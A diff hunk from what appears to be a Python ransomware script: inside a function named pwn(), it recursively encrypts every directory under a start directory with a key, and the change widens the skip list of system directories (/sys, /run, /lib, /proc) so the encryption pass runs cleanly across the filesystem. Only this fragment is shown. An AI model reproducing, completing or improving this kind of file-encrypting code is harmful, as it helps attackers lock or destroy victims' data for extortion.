@@ -116,7 +116,7 @@ def pwn():
             directory = START_DIR + dir
         else:
             directory = START_DIR + '/' + dir
-        if (directory != '/run') and (directory != '/lib') and (directory != '/proc'):
+        if directory not in ('/sys', '/run', '/lib', '/proc'):
             print('Encrypting {}'.format(directory))
             recurse(directory, key)
     files = next(os.walk(START_DIR))[2]
